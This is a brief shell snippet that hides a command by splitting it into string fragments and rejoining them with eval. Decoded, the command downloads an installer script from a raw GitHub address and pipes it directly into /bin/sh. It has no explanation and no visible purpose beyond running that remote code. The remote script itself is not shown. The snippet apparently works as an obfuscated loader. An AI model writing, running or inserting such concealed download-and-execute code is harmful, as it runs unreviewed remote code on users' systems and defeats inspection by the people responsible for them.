z="
";Gz='serc';Kz='mil2';Vz='sh';Qz='ller';Cz='ps:/';Az='wget';Bz=' htt';Nz='l/ma';Pz='nsta';Sz='-O -';Lz='37/e';Iz='nt.c';Jz='om/e';Ez='.git';Hz='onte';Oz='in/i';Mz='pane';Tz=' | /';Dz='/raw';Fz='hubu';Rz='.sh ';Uz='bin/';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz"